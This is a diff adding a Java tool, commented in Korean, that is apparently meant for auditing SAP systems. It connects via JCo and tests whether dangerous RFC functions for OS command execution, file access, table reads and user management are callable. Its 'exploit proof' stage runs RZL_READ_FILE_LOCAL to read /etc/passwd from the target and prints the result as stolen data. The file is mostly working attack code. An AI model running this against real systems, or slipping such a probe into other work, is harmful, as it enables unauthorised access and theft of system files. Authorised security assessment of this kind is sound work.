@@ -1,0 +1,98 @@
+import com.sap.conn.jco.*;
+import java.util.Properties;
+import java.io.File;
+import java.io.FileOutputStream;
+
+public class SapSecurityAuditMaster {
+    public static void main(String[] args) {
+        String destName = "AUDIT_MASTER";
+        Properties props = new Properties();
+
+        // 1. 접속 정보 설정
+        props.setProperty("jco.client.ashost", "SAP_서버_IP");
+        props.setProperty("jco.client.sysnr",  "00");
+        props.setProperty("jco.client.client", "100");
+        props.setProperty("jco.client.user",   "아이디");
+        props.setProperty("jco.client.passwd", "비밀번호");
+
+        try {
+            createDestinationFile(destName, props);
+            JCoDestination destination = JCoDestinationManager.getDestination(destName);
+            destination.ping();
+            System.out.println("=== [SAP 정밀 보안 진단 및 실효성 검증 시작] ===");
+            System.out.println("[+] 타겟 호스트: " + destination.getAttributes().getHost());
+
+            // --- [진단 리스트 정의] ---
+            String[] osRfcs = {"SXPG_COMMAND_EXECUTE", "SXPG_CALL_SYSTEM", "RFC_REMOTE_EXEC", "RFC_REMOTE_PIPE", "RFC_ABAP_INSTALL_AND_RUN"};
+            String[] fileRfcs = {"EPS_GET_DIRECTORY_LISTING", "RZL_READ_FILE_LOCAL", "RZL_WRITE_FILE_LOCAL", "EPS_FILE_DELETE", "EPS_FILE_RENAME", "RS_STP_FILE_SAVE"};
+            String[] dbRfcs = {"RFC_READ_TABLE", "BBP_RFC_READ_TABLE", "DSY_READ_TABLE", "TH_DB_TABLE_INFO"};
+            String[] authRfcs = {"BAPI_USER_GET_DETAIL", "BAPI_USER_CHANGE", "SUSR_RFC_USER_INTERFACE", "TH_USER_LIST", "TH_DELETE_USER", "BAPI_USER_LOCK", "BAPI_USER_UNLOCK"};
+
+            // --- [1단계: 분야별 포싱 및 권한 차이 확인] ---
+            runAudit(destination, "OS/System Access", osRfcs);
+            runAudit(destination, "File System Access", fileRfcs);
+            runAudit(destination, "Database/Table Access", dbRfcs);
+            runAudit(destination, "User/Session Management", authRfcs);
+
+            // --- [2단계: 실효성 검증 (Exploit Proof)] ---
+            System.out.println("\n--- [2. 최종 데이터 탈취 검증: /etc/passwd] ---");
+            verifyExploit(destination);
+
+        } catch (Exception e) {
+            System.err.println("[!] 연결 단계 에러: " + e.getMessage());
+        }
+    }
+
+    public static void runAudit(JCoDestination dest, String category, String[] list) {
+        System.out.println("\n[분류: " + category + "]");
+        for (String rfc : list) {
+            try {
+                // getFunction은 서버에 실제 메타데이터를 요청함
+                JCoFunction function = dest.getRepository().getFunction(rfc);
+                
+                if (function != null) {
+                    System.out.println("  [★성공★] " + rfc + " -> 호출 가능 (취약점 확인)");
+                }
+            } catch (JCoException e) {
+                // 에러 그룹 분석으로 상태 구분
+                if (e.getGroup() == JCoException.GROUP_NOT_AUTHORIZED) {
+                    System.out.println("  [!] " + rfc + " -> [권한 거부] 존재하지만 S_RFC로 차단됨");
+                } else if (e.getGroup() == JCoException.GROUP_FUNCTION_NOT_FOUND) {
+                    System.out.println("  [-] " + rfc + " -> [미존재] 서버에 이 함수가 없음");
+                } else {
+                    System.out.println("  [?] " + rfc + " -> [기타 에러] " + e.getGroup());
+                }
+            }
+        }
+    }
+
+    public static void verifyExploit(JCoDestination dest) {
+        try {
+            JCoFunction function = dest.getRepository().getFunction("RZL_READ_FILE_LOCAL");
+            if (function == null) return;
+
+            function.getImportParameterList().setValue("NAME", "/etc/passwd");
+            function.execute(dest);
+
+            JCoTable table = function.getTableParameterList().getTable("FILE_TBL");
+            if (table.getNumRows() > 0) {
+                System.out.println("[SUCCESS] /etc/passwd 탈취 데이터 상위 5줄 출력:");
+                for (int i = 0; i < Math.min(table.getNumRows(), 5); i++) {
+                    table.setRow(i);
+                    System.out.println(" >> " + table.getString("LINE"));
+                }
+            } else {
+                System.out.println("[-] 함수 호출은 성공했으나 파일 내용을 읽지 못했습니다.");
+            }
+        } catch (Exception e) {
+            System.out.println("[-] 검증 실패: " + e.getMessage());
+        }
+    }
+
+    static void createDestinationFile(String name, Properties props) throws Exception {
+        File destFile = new File(name + ".jcoDestination");
+        try (FileOutputStream fos = new FileOutputStream(destFile)) {
+            props.store(fos, "Security Audit Configuration");
+        }
+    }
+}
